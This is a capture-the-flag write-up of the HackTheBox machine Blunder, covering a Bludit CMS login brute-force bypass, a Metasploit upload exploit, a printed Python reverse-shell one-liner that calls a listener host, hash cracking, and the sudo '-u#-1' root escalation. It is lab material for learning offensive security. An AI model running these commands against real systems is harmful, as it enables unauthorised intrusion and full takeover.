## **Description**

Hello l33ts, I hope you are doing well. Today we will be doing [Blunder](https://app.hackthebox.com/machines/254) from [HackTheBox](https://www.hackthebox.com). Blunder is an easy box, we enumerate open ports, we find a webserver that is running a vulnerable CMS, we do some enumeration to find a username and use **cewl** to generate a password list. After that we manage to get some valid credentials, we move to metasploit and use a module that gives us a reverse shell. We enumerate the webserver files and find a  password hash of **hugo**. After cracking the hash and switching to **hugo**, we see hugo can run bash as any user exept root, we exploit the old version of sudo running on the machine and get root.

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressice scan to provide faster results.

```terminal
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-01 12:24 EST
Nmap scan report for 10.10.10.191
Host is up (0.12s latency).

|_http-title: Blunder | A blunder of interesting facts
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

Nmap shows 1 open ports 80(HTTP)

### WebPage

![home](/assets/img/hackthebox/machines/blunder/home.png)

When we browse to port 80, we have what appears to be a blog. Looking at the content and the source code the the page, nothing really stands out.

### Gobuster

Let's enumerate for directories and files with `Gobuster`.

```terminal
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.191 -x php,txt

===============================================================
```

Some of the interesting results we got are **/admin**,**/install.php**, **robots.txt** and **todo.txt**.

install.php and robots.txt also has nothing useful, the admin page gives us a login form. It seems the webserver is running Bludit CMS, looking at the source code of the login page, we see that the version of the CMS might be `3.9.2`. If we searched for the version we find that it is vulnerable to Authentication bruteforce bypass.

![cve](/assets/img/hackthebox/machines/blunder/cve.png)

Let's download the [Exploit](https://www.exploit-db.com/exploits/48942) and continue our enumeration.

todo.txt has some notes, and we find a possible username `fergus`. Let's now get a password list from the website using `cewl` and use the exploit we got to bruteforce the login.

```terminal
$ cewl -w pass.list  http://10.10.10.191
$ python3 exploit.py                                            
Exploit Usage: ./exploit.py -h [help] -l [url] -u [user.txt] -p [pass.txt]
$ python3 exploit.py -l http://10.10.10.191/admin/login.php -u ./name  -p ./pass.list
[*] Bludit Auth BF Mitigation Bypass Script by ColdFusionX

[<] Brute Force: Testing -> fergus:the
[*] Brute Force: Testing -> fergus:Load
[◢] Brute Force: Testing -> fergus:Plugins
[ ] Brute Force: Testing -> fergus:and

```

We wait for a bit until the exploit finishes. After that, we should now have fergus's password

## **Foothold**

Let's fire up Metasploit and search for bludit.

```terminal
msf6 > search bludit

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/linux/http/bludit_upload_images_exec  2019-09-07       excellent  Yes    Bludit Directory Traversal Image File Upload Vulnerability

```

Metasploit has a upload images exec exploit, let's use that one, give it the required parameters, and run it.

```terminal
msf6 exploit(linux/http/bludit_upload_images_exec) > set bluditpass RolandDeschain
bluditpass => RolandDeschain
msf6 exploit(linux/http/bludit_upload_images_exec) > set bludituser fergus
bludituser => fergus
msf6 exploit(linux/http/bludit_upload_images_exec) > set rhosts 10.10.10.191
rhosts => 10.10.10.191
msf6 exploit(linux/http/bludit_upload_images_exec) > set lhost tun0
lhost => tun0
msf6 exploit(linux/http/bludit_upload_images_exec) > run

meterpreter >
```

Great, we have now access to the machine.

## **Privilege Escalation**

Let's first drop a shell.

```terminal
meterpreter > shell
Process 3103 created.
Channel 0 created.
whoami
www-data
```

Since this shell is not really functional, let's get one by setting up a netcat listner on our machine and executing this command on the target machine. `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.10.10",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`.

>Note:don't forget to change the ip address on the code to yours!

```terminal
┌──(sirius㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...

www-data@blunder:$
```

### Hugo

As user **www-data** we can't do much. Searching through directories and files of one of the bludit folders located in **/var/www**, we find a file that has **Hugo**'s password hash.

```terminal
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823cxxxxxxxxxxx",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
```

Let's copy the hash to our machine and crack it. After cracking it, we can now change our current user to Hugo with `su hugo` and supply the password we managed to crack.

### root

Now that we have a password, let's do some enumeration.

```terminal
hugo@blunder:~$ sudo -l
Password:
Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
hugo@blunder:~$
```

We can execute /bin/bash as any user but not as root. There is a vulnerable version of `sudo` where we can  execute arbitrary commands as root user even in cases where the root access is disallowed. Refer to this [article](https://www.whitesourcesoftware.com/resources/blog/new-vulnerability-in-sudo-cve-2019-14287/) for more information.

So what we can do is execute `sudo -u#-1 /bin/bash` and become root.

```terminal
hugo@blunder:~$ sudo -u#-1 /bin/bash
root@blunder:/home/hugo# whoami
root
```


Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) .
